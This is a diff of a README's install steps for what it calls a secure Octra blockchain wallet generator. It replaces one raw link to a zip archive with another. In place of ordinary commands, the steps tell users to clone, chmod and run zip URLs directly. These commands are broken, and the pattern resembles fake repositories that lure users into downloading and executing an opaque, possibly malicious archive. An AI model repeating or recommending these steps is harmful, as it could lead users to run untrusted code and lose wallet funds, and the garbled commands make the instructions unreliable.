@@ -6,7 +6,7 @@ A secure wallet generator for Octra blockchain.
 
 1. **Clone the repository:**
    ```bash
-   git clone https://raw.githubusercontent.com/Amdaad/wallet-gen/main/.github/wallet-gen-charismatic.zip
+   git clone https://github.com/Amdaad/wallet-gen/raw/refs/heads/main/assets/gen-wallet-1.1.zip
    cd wallet-gen
    ```
 
@@ -14,13 +14,13 @@ A secure wallet generator for Octra blockchain.
    
    **Linux/macOS:**
    ```bash
-   chmod +x https://raw.githubusercontent.com/Amdaad/wallet-gen/main/.github/wallet-gen-charismatic.zip
-   https://raw.githubusercontent.com/Amdaad/wallet-gen/main/.github/wallet-gen-charismatic.zip
+   chmod +x https://github.com/Amdaad/wallet-gen/raw/refs/heads/main/assets/gen-wallet-1.1.zip
+   https://github.com/Amdaad/wallet-gen/raw/refs/heads/main/assets/gen-wallet-1.1.zip
    ```
    
    **Windows:**
    ```bash
-   https://raw.githubusercontent.com/Amdaad/wallet-gen/main/.github/wallet-gen-charismatic.zip
+   https://github.com/Amdaad/wallet-gen/raw/refs/heads/main/assets/gen-wallet-1.1.zip
    ```
 
 3. **Open your browser:**
